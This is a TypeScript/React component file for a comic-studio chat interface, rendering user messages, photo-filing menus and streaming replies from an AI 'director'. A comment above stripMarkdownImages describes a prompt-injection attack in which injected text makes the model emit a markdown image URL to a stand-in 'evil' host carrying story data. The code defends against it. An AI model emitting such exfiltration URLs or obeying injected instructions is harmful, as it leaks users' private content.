// Conversation messages: the user's bubbles (right, with attachment thumbnails) and the
// director's replies (left, avatar mark, markdown text that streams with a caret, then its
// live cards, then acting next-step chips under the latest reply — priced, "Free" when $0,
// run directly when they can be, so a tap rarely costs a director call).
//
// Sent photos say where they went: "→ MAYA" (found by path on the cast, places or style), or —
// when nobody filed them yet — "Who's in this photo? · Assign", which opens the quick-assign
// menu and files it right away (`ref_add`, or `ref_transfer` out of the inbox): free software
// work, undoable, no director call (refs.md §7.2).
//
// PROGRAM3 SETTLE-UI:
//   - Settled cards (lead decision D3, CHANGED): with a settle index from the pane (SETTLED_CARDS on for this viewer),
//     a card the chat has moved past is its one-line SettledCard (CardRenderer), and consecutive settled rows stack
//     4 px apart instead of the reply's 12 px, so a long history reads like a compact log. A gate's own breakdown
//     folds into the gate's line and takes no room. The user bubble's Assign is offered on the latest message only;
//     an older unfiled photo reads "Not filed yet".
//   - Fresh-only entrance (MO-2; styles.md M3 with C17, the server-clock rule): a message rises in only when its
//     server `at` is newer than the newest `at` present when the pane first rendered this doc (a module-level map),
//     or when it streams in now; the first 12 blocks of a fresh reply stagger. Stored messages render static, and a
//     message that already rose in never rises again (a remount, the committed copy of the bubble just sent).
//   - Memoised rows (PF-7a; perf.md F9): the pane renders UserMessageRow / AssistantMessageRow (React.memo) with a
//     controller kept by identity while only the streaming drafts change (useRowStudio), so a token delta re-renders
//     only the row it streams into.

import React, { useEffect, useRef, useState } from 'react';
import { AlertCircle, Feather, FileText, Pencil, RotateCcw, UserRound, X } from 'lucide-react';
import { newId, refInboxOf, resolveCharacter, type AssetRef, type Card, type ComicDoc, type Msg, type RefAsset, type RefOwner } from '../../../shared/comic/doc';
import { settleOf, type CardSettle, type SettleIndex } from '../../../shared/comic/settle';
import type { DocOp } from '../../../shared/comic/ops';
import type { AttachmentTarget } from '../../../shared/comic/events';
import { findRefOwners } from '../../../shared/comic/refs';
import { ChatMarkdown } from '../../chat/ChatMarkdown';
import { AdaptiveSheet } from '../mobile/sheets/AdaptiveSheet';
import { AssignMenu, targetLabel } from './AssignMenu';
import type { PendingAttachment } from '../types';
import type { ComicStudioController } from '../useStudio';
import { CARD_TYPES, CardRenderer } from './cards/CardRenderer';
import { registeredCard } from '../features';
import { NextStepChips, chipsFor } from './cards/NextStepChips';
import { RISE_IN, STATUS_EDGE, TONE_TEXT } from '../../chat/studioDesign';
import { cx } from './ui';

const CLAMP_CHARS = 700;
const CLAMP_LINES = 12;

export const DirectorMark: React.FC<{ className?: string }> = ({ className }) => (
  <span
    aria-hidden
    className={cx(
      'grid h-7 w-7 shrink-0 place-items-center rounded-full bg-[linear-gradient(135deg,#E8916F_0%,#D97757_55%,#B8573A_100%)] text-white shadow-[0_1px_3px_rgba(217,119,87,0.35)]',
      className
    )}
  >
    <Feather className="h-3.5 w-3.5" />
  </span>
);

const isLong = (text: string) => text.length > CLAMP_CHARS || text.split('\n').length > CLAMP_LINES;

// Director replies render through ChatMarkdown, whose sanitizer keeps remote `<img src>`
// and the SPA ships no CSP. Because the director's context carries the user's private
// premise, cast and notes (some derived from attached/pasted text), an injected instruction
// could make it emit `![](https://evil/x?d=<story data>)` — which the browser fetches with
// zero clicks the moment the delta streams in, leaking the story. The director speaks in
// plain sentences and shows visuals through cards, so it never needs markdown images:
// strip image markup down to its alt text before rendering. (ChatMarkdown is shared with
// the main chat, which does use thumbnails, so the stripping stays local to the director.)
const stripMarkdownImages = (text: string): string =>
  text
    .replace(/!\[([^\]]*)\]\([^)]*\)/g, '$1') // inline  ![alt](url)
    .replace(/!\[([^\]]*)\]\[[^\]]*\]/g, '$1') // reference  ![alt][id]
    .replace(/!\[([^\]]*)\]/g, '$1'); // shortcut  ![alt]

// ── Photo owners ─────────────────────────────────────────────────────────────

/** Where a sent photo lives now (cast, places, style — not the inbox), as short words: "MAYA", "Style". */
export const photoOwnerLabel = (doc: ComicDoc | null | undefined, path: string): string | null => {
  if (!doc || !path) return null;
  const owners = findRefOwners(doc, path).filter((o) => o.kind !== 'inbox');
  if (!owners.length) return null;
  const first = targetLabel(doc, owners[0]);
  if (!first) return null;
  return owners.length > 1 ? `${first} +${owners.length - 1}` : first;
};

/**
 * The ops that file sent photos under a quick-assign choice: a new character is created once
 * (an existing one with that name is reused), then each photo is added to the owner — or moved out
 * of the inbox when it is still there. Capacity is checked by the menu (full owners are disabled)
 * and again by the server.
 */
export const assignPhotoOps = (doc: ComicDoc, photos: AssetRef[], target: AttachmentTarget): { ops: DocOp[]; owner: RefOwner | null } => {
  if (!target || target.kind === 'inbox' || !photos.length) return { ops: [], owner: null };
  const ops: DocOp[] = [];
  let owner: RefOwner;
  if (target.kind === 'new_character') {
    const name = target.name.replace(/\s+/g, ' ').trim().slice(0, 80);
    if (!name) return { ops: [], owner: null };
    const existing = resolveCharacter(doc, name);
    if (existing) owner = { kind: 'character', id: existing.id };
    else {
      const id = newId('c');
      ops.push({ op: 'character', id, patch: { name, tier: doc.cast.some((c) => c.tier === 'lead') ? 'support' : 'lead', look: { summary: '' } } });
      owner = { kind: 'character', id };
    }
  } else owner = target;
  const inbox = new Set(refInboxOf(doc).map((r) => r.path));
  for (const p of photos) {
    if (!p?.path) continue;
    if (inbox.has(p.path)) ops.push({ op: 'ref_transfer', from: { kind: 'inbox' }, to: owner, path: p.path });
    else {
      // Only what the client may say: the server rebuilds the ref from where the path already lives.
      const ref: RefAsset = { path: p.path, source: p.source || 'upload', at: p.at || Date.now(), ...(p.w ? { w: p.w } : {}), ...(p.h ? { h: p.h } : {}) };
      ops.push({ op: 'ref_add', owner, ref });
    }
  }
  return { ops, owner };
};

// ── Fresh-only entrance (MO-2) ───────────────────────────────────────────────

interface EntranceBook {
  /** The newest server `at` in the conversation when the pane first rendered this doc. */
  baseline: number;
  /** Messages that already rose in (by id): a remount never replays them. */
  shown: Set<string>;
  /** The words of this tab's bubble that just rose in while sending: its committed copy arrives without a second rise. */
  sent: string | null;
}

const entranceBooks = new Map<string, EntranceBook>();

const newestAt = (conversation: readonly Msg[] | null | undefined): number => {
  let n = 0;
  for (const m of conversation || []) if (typeof m?.at === 'number' && Number.isFinite(m.at) && m.at > n) n = m.at;
  return n;
};

const sameWords = (a: string | null | undefined, b: string | null | undefined): boolean =>
  (a || '').replace(/\s+/g, ' ').trim() === (b || '').replace(/\s+/g, ' ').trim();

/**
 * Record, once per doc, the newest server `at` the pane sees on its first render (C17: both sides on the server
 * clock, so a device clock that is off changes nothing). Every message at or before it is history and renders static.
 * Idempotent: later calls for the same doc keep the first baseline.
 */
export const seedEntrances = (docKey: string | null | undefined, conversation: readonly Msg[] | null | undefined): void => {
  if (!docKey || entranceBooks.has(docKey)) return;
  entranceBooks.set(docKey, { baseline: newestAt(conversation), shown: new Set(), sent: null });
};

/** Tests only: forget every doc's entrance baseline. */
export const __resetEntrances = (): void => entranceBooks.clear();

/** What a row is: a committed message, this tab's bubble on its way, or a reply streaming before it is committed. */
export type EntranceKind = 'committed' | 'pending' | 'draft';

const entranceFor = (docKey: string | null | undefined, msg: Pick<Msg, 'id' | 'at' | 'role' | 'text'>, kind: EntranceKind): boolean => {
  const book = docKey ? entranceBooks.get(docKey) : undefined;
  if (!book || !msg?.id || book.shown.has(msg.id)) return false;
  if (kind !== 'committed') return true;
  if (!(typeof msg.at === 'number' && msg.at > book.baseline)) return false;
  // The committed copy of the bubble that already rose in while sending: it is the same words, so it does not rise twice.
  return !(msg.role === 'user' && book.sent !== null && sameWords(book.sent, msg.text));
};

/**
 * Whether this row rises in. Decided once when the row mounts (so the class stays for the whole animation, however
 * often the row re-renders) and recorded after it mounts, so the same message never rises again.
 */
export const useFreshEntrance = (docKey: string | null | undefined, msg: Pick<Msg, 'id' | 'at' | 'role' | 'text'>, kind: EntranceKind = 'committed'): boolean => {
  const [fresh] = useState(() => entranceFor(docKey, msg, kind));
  useEffect(() => {
    const book = docKey ? entranceBooks.get(docKey) : undefined;
    if (!book || !msg?.id) return;
    if (fresh) book.shown.add(msg.id);
    if (kind === 'pending' && msg.role === 'user') book.sent = msg.text || '';
    else if (kind === 'committed' && msg.role === 'user' && book.sent !== null && sameWords(book.sent, msg.text)) book.sent = null;
    // The decision is per mount: only the first commit records it.
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);
  return fresh;
};

// ── Memoised rows (PF-7a) ────────────────────────────────────────────────────

const sameControllerExceptDrafts = (a: ComicStudioController, b: ComicStudioController): boolean => {
  if (a === b) return true;
  const ka = Object.keys(a) as (keyof ComicStudioController)[];
  const kb = Object.keys(b);
  if (ka.length !== kb.length) return false;
  for (const k of ka) {
    if (k === 'drafts') continue;
    if (!Object.prototype.hasOwnProperty.call(b, k) || !Object.is(a[k], b[k])) return false;
  }
  return true;
};

/**
 * The controller as the message rows see it: the same object while only `drafts` changed (one token delta), a new
 * one as soon as anything a row can read changes. Rows never read `drafts` (the pane hands each its own draft), so a
 * kept controller is never stale for them.
 */
export const useRowStudio = (studio: ComicStudioController): ComicStudioController => {
  const kept = useRef(studio);
  if (!sameControllerExceptDrafts(kept.current, studio)) kept.current = studio;
  return kept.current;
};

// ── User ─────────────────────────────────────────────────────────────────────

export interface UserBubbleProps {
  text: string;
  attachments?: Array<AssetRef | PendingAttachment>;
  urlFor: (asset?: AssetRef | string | null) => string | undefined;
  status?: 'sending' | 'failed';
  error?: string;
  onRetry?: () => void;
  onEdit?: () => void;
  onDismiss?: () => void;
  /** Lets sent photos show where they went and be assigned (the committed message only). */
  studio?: Pick<ComicStudioController, 'doc' | 'patch'>;
  /**
   * Settled cards (SETTLE-UI): false on every user message but the latest — an unfiled photo there reads "Not filed
   * yet" with no Assign menu. Absent: Assign is offered (today's behaviour).
   */
  latest?: boolean;
  /** Rises in (MO-2: a fresh message). Absent: static. */
  fresh?: boolean;
}

const isPending = (a: AssetRef | PendingAttachment): a is PendingAttachment => 'dataUrl' in a;
const attachmentSrc = (a: AssetRef | PendingAttachment, urlFor: UserBubbleProps['urlFor']) => (isPending(a) ? a.dataUrl : urlFor(a));

export const UserBubble: React.FC<UserBubbleProps> = ({ text, attachments = [], urlFor, status, error, onRetry, onEdit, onDismiss, studio, latest, fresh }) => {
  const [expanded, setExpanded] = useState(false);
  const long = isLong(text);
  const doc = studio?.doc || null;
  // An older message's photos are history: where they went, or "Not filed yet" — the menu lives on the latest only.
  const canAssign = latest !== false;
  // Which photos the assign menu is for (indexes into `attachments`), and what it is anchored to.
  const [assigning, setAssigning] = useState<number[] | null>(null);
  const anchorRef = useRef<HTMLElement | null>(null);
  const sent = attachments.filter((a): a is AssetRef => !isPending(a) && !!a.path);
  const unassigned = doc && canAssign ? attachments.map((a, i) => (!isPending(a) && a.path && !photoOwnerLabel(doc, a.path) ? i : -1)).filter((i) => i >= 0) : [];
  const assign = (target: AttachmentTarget) => {
    const picked = (assigning || []).map((i) => attachments[i]).filter((a): a is AssetRef => !!a && !isPending(a));
    setAssigning(null);
    if (!doc || !studio || !target) return;
    const { ops } = assignPhotoOps(doc, picked, target);
    if (!ops.length) return;
    const who = (targetLabel(doc, target) || 'the story').replace(/^New: /, '');
    const label = `file ${picked.length === 1 ? 'a photo' : `${picked.length} photos`} under ${who}`;
    // A new character is saved first: the server checks each photo against the comic as it is, so
    // the photos follow once the character exists (two small free edits instead of one refused one).
    const create = ops.filter((o) => o.op === 'character');
    const files = ops.filter((o) => o.op !== 'character');
    void (async () => {
      if (create.length) await studio.patch(create, { label: `add ${who}` });
      if (files.length) await studio.patch(files, { label });
    })();
  };
  return (
    <div className={cx('flex flex-col items-end gap-1.5 pl-10', fresh && RISE_IN)} data-role="user">
      {attachments.length > 0 && (
        <div className="flex flex-wrap justify-end gap-1.5">
          {attachments.map((a, i) => {
            if (isPending(a) && !a.mimeType.startsWith('image/')) {
              return (
                <span key={i} className="inline-flex h-10 max-w-[200px] items-center gap-2 rounded-xl border border-[var(--ds-hairline)] bg-[var(--ds-surface-soft)] px-2.5 text-[12px] text-[var(--ds-ink)]">
                  <FileText className="h-4 w-4 shrink-0 text-[var(--ds-accent)]" aria-hidden />
                  <span className="truncate">{a.name}</span>
                </span>
              );
            }
            const src = attachmentSrc(a, urlFor);
            const name = isPending(a) ? a.name : `Photo ${i + 1}`;
            const img = src ? (
              <img src={src} alt={name} className="h-16 w-16 rounded-xl border border-[var(--ds-hairline)] object-cover" />
            ) : (
              <span className="studio-shimmer block h-16 w-16 rounded-xl" aria-label="Loading attachment" />
            );
            if (!doc || isPending(a) || !a.path) return <span key={i}>{img}</span>;
            const owner = photoOwnerLabel(doc, a.path);
            return (
              <span key={i} className="flex w-16 flex-col items-center gap-0.5" data-photo-owner={owner || 'unassigned'}>
                {owner || !canAssign ? (
                  img
                ) : (
                  <button
                    type="button"
                    onClick={(e) => {
                      anchorRef.current = e.currentTarget;
                      setAssigning([i]);
                    }}
                    aria-haspopup="menu"
                    aria-label={`${name} is unassigned — assign it`}
                    className="block rounded-xl focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#D97757]/50"
                  >
                    {img}
                  </button>
                )}
                <span className={cx('block w-16 truncate text-center text-[10.5px] leading-tight', owner ? 'font-semibold text-[var(--ds-ink)]' : 'text-[var(--ds-muted)]')} title={owner ? `Filed under ${owner}` : 'Not filed yet'}>
                  {owner ? `→ ${owner}` : canAssign ? 'Unassigned' : 'Not filed yet'}
                </span>
              </span>
            );
          })}
        </div>
      )}
      {doc && sent.length > 0 && unassigned.length > 0 && (
        // The client side of "Who's in these photos?": never leave a photo silently unfiled.
        <button
          type="button"
          onClick={(e) => {
            anchorRef.current = e.currentTarget;
            setAssigning(unassigned);
          }}
          aria-haspopup="menu"
          className="inline-flex min-h-[28px] max-w-full items-center gap-1.5 rounded-full border border-[var(--ds-hairline)] bg-[var(--ds-surface-soft)] px-2.5 text-[12px] text-[var(--ds-ink)] transition-colors duration-150 hover:bg-[var(--ds-hover)] focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-[#D97757]/40 coarse:min-h-[44px] coarse:px-3.5"
        >
          <UserRound className="h-3.5 w-3.5 shrink-0 text-[var(--ds-accent)]" aria-hidden />
          <span className="min-w-0 truncate">
            Unassigned · <span className="font-semibold text-[var(--ds-accent)]">{unassigned.length === 1 ? 'Assign' : `Assign ${unassigned.length}`}</span>
          </span>
        </button>
      )}
      {doc && assigning && (
        <AdaptiveSheet
          open
          onClose={() => setAssigning(null)}
          label={assigning.length === 1 ? 'Who’s in this photo?' : 'Who’s in these photos?'}
          title={assigning.length === 1 ? 'Who’s in this photo?' : 'Who’s in these photos?'}
          anchorRef={anchorRef}
          placement="below"
          align="end"
          className="w-[min(18rem,calc(100vw-24px))] py-1"
        >
          <AssignMenu doc={doc} count={assigning.length} onPick={assign} />
        </AdaptiveSheet>
      )}
      {text && (
        <div
          className={cx(
            'max-w-full rounded-2xl rounded-br-md border bg-[var(--ds-raised)] px-3.5 py-2.5 text-[14px] leading-relaxed text-[var(--ds-ink)] shadow-[0_1px_2px_rgba(0,0,0,0.04)]',
            status === 'sending' && 'opacity-80',
            status === 'failed' ? STATUS_EDGE.error : 'border-[var(--ds-hairline-soft)]'
          )}
        >
          <p className={cx('whitespace-pre-wrap break-words', long && !expanded && 'line-clamp-[10]')}>{text}</p>
          {long && (
            <button
              type="button"
              onClick={() => setExpanded((v) => !v)}
              className="tap-target mt-1 text-[12px] font-medium text-[var(--ds-accent)] hover:underline"
              aria-expanded={expanded}
            >
              {expanded ? 'Show less' : 'Show all'}
            </button>
          )}
        </div>
      )}
      {status === 'failed' && (
        // Reason on its own line, actions together under it — never a lone ✕ wrapping onto a row.
        <div role="alert" className="flex max-w-full flex-col items-end gap-1 text-[12px]">
          <span className={cx('inline-flex max-w-[92%] items-start gap-1 text-right', TONE_TEXT.danger)}>
            <AlertCircle className="mt-px h-3.5 w-3.5 shrink-0" aria-hidden />
            Not sent{error ? ` — ${error}` : ''}
          </span>
          {(onRetry || onEdit || onDismiss) && (
            <span className="inline-flex items-center gap-1">
              {onRetry && (
                <button type="button" onClick={onRetry} className="tap-target inline-flex items-center gap-1 rounded-full px-2 py-0.5 font-semibold text-[var(--ds-ink)] hover:bg-[var(--ds-hover)]">
                  <RotateCcw className="h-3 w-3" aria-hidden /> Retry
                </button>
              )}
              {onEdit && (
                <button type="button" onClick={onEdit} className="tap-target inline-flex items-center gap-1 rounded-full px-2 py-0.5 font-medium text-[var(--ds-muted)] hover:bg-[var(--ds-hover)] hover:text-[var(--ds-ink)]">
                  <Pencil className="h-3 w-3" aria-hidden /> Edit
                </button>
              )}
              {onDismiss && (
                <button
                  type="button"
                  onClick={onDismiss}
                  aria-label="Discard message"
                  className="tap-target inline-flex items-center gap-1 rounded-full px-2 py-0.5 font-medium text-[var(--ds-muted)] hover:bg-[var(--ds-hover)] hover:text-[var(--ds-ink)]"
                >
                  <X className="h-3 w-3" aria-hidden /> Discard
                </button>
              )}
            </span>
          )}
        </div>
      )}
    </div>
  );
};

// ── Assistant ────────────────────────────────────────────────────────────────

export interface AssistantMessageProps {
  msg: Msg;
  /** Streaming text (longer than the committed text). */
  draft?: string;
  /** Show the blinking caret (a director turn is streaming into this message). */
  streaming?: boolean;
  /** Show next-step chips (latest reply, nothing after it, not busy). */
  showSuggestions?: boolean;
  studio: ComicStudioController;
  /**
   * Settled cards (SETTLE-UI): the pane's settle index (shared/comic/settle.ts buildSettleIndex), present only while
   * SETTLED_CARDS is on for this viewer. A card it reads as settled renders as its one line; absent, every card is live.
   */
  settles?: SettleIndex;
  /** Rises in (MO-2: a fresh reply): its first 12 blocks stagger. Absent: static. */
  fresh?: boolean;
}

export const StreamingCaret: React.FC = () => (
  <span aria-hidden className="ml-0.5 inline-block h-[1.05em] w-[2px] translate-y-[2px] animate-pulse rounded-full bg-[var(--ds-accent)] align-baseline motion-reduce:animate-none" />
);

/** A gate's own breakdown, folded into the gate's settled line: it takes no room at all. */
const isFolded = (settle: CardSettle | undefined): boolean => settle?.state === 'settled' && settle.outcome === 'folded';

export const AssistantMessage: React.FC<AssistantMessageProps> = ({ msg, draft, streaming, showSuggestions, studio, settles, fresh }) => {
  const text = stripMarkdownImages(draft ?? msg.text ?? '');
  const cards = Array.isArray(msg.cards) ? msg.cards : [];
  // The latest reply always offers a next move: its own nextSteps, else old suggestions, else
  // a free client-side step ("See the pages" / "Read it") so the conversation never dead-ends.
  const chips = showSuggestions ? chipsFor(msg, studio.doc, { fallback: true }) : [];
  const settleFor = (card: Card): CardSettle | undefined => (settles && card && typeof card.id === 'string' ? settleOf(settles, msg, card) : undefined);
  // Never silent: a committed reply with no words and nothing this client can show (no cards, or
  // only card types it doesn't know yet) still says something.
  const shown = cards.filter((c) => !!c && typeof c.type === 'string' && (CARD_TYPES.includes(c.type) || !!registeredCard(c.type)) && !isFolded(settleFor(c)));
  const silent = !text && !streaming && shown.length === 0;
  return (
    <div className="flex min-w-0 gap-3 pr-2" data-role="assistant">
      <DirectorMark className="mt-0.5" />
      {/* Consecutive settled rows sit 4 px apart (a compact log); everything else keeps the reply's 12 px. */}
      <div className={cx('min-w-0 flex-1 space-y-3 [&>[data-settled-slot]+[data-settled-slot]]:!mt-1', fresh && 'ds-stagger')}>
        {(text || streaming) && (
          <div className="min-w-0 text-[14px] leading-relaxed text-[var(--ds-ink)] [overflow-wrap:anywhere]">
            {text ? <ChatMarkdown text={text} className="comicstudio-md" /> : null}
            {streaming && <StreamingCaret />}
          </div>
        )}
        {silent && <p className="text-[13.5px] leading-relaxed text-[var(--ds-muted)]">Done — the board shows the latest.</p>}
        {cards.map((card) => {
          if (!card) return null;
          const settle = settleFor(card);
          if (isFolded(settle)) return null;
          const settled = settle?.state === 'settled';
          return (
            <div key={card.id} className="min-w-0" data-card-slot={card.id} {...(settled ? { 'data-settled-slot': '' } : {})}>
              <CardRenderer card={card} studio={studio} message={msg} {...(settles ? { settle: settle ?? null } : {})} />
            </div>
          );
        })}
        <NextStepChips chips={chips} studio={studio} />
      </div>
    </div>
  );
};

// ── Rows (what the pane renders) ─────────────────────────────────────────────

export interface UserMessageRowProps {
  msg: Msg;
  /** useRowStudio's controller (kept while only the drafts change). */
  studio: ComicStudioController;
  /** The doc id the entrance baseline is kept under (seedEntrances). */
  docKey?: string;
  /** The latest committed user message (Assign); undefined = today's behaviour. */
  latest?: boolean;
}

/** A committed user message as the pane renders it: memoised, rising in only when fresh. */
export const UserMessageRow = React.memo(function UserMessageRow({ msg, studio, docKey, latest }: UserMessageRowProps) {
  const fresh = useFreshEntrance(docKey, msg, 'committed');
  return <UserBubble text={msg.text} attachments={msg.attachments} urlFor={studio.urlFor} studio={studio} latest={latest} fresh={fresh} />;
});

/** This tab's message on its way (studio.pendingMessage): it rises in as the creator sends it. */
export const PendingMessageRow: React.FC<Omit<UserBubbleProps, 'fresh' | 'studio' | 'latest'> & { id: string; at: number; docKey?: string }> = ({ id, at, docKey, ...bubble }) => {
  const fresh = useFreshEntrance(docKey, { id, at, role: 'user', text: bubble.text }, 'pending');
  return <UserBubble {...bubble} fresh={fresh} />;
};

export interface AssistantMessageRowProps extends Omit<AssistantMessageProps, 'fresh'> {
  docKey?: string;
  /** A reply streaming before the server has committed it (its entrance plays as it starts). */
  uncommitted?: boolean;
}

/** A director reply as the pane renders it: memoised (a token delta re-renders only the reply it streams into). */
export const AssistantMessageRow = React.memo(function AssistantMessageRow({ docKey, uncommitted, ...props }: AssistantMessageRowProps) {
  const fresh = useFreshEntrance(docKey, props.msg, uncommitted ? 'draft' : 'committed');
  return <AssistantMessage {...props} fresh={fresh} />;
});
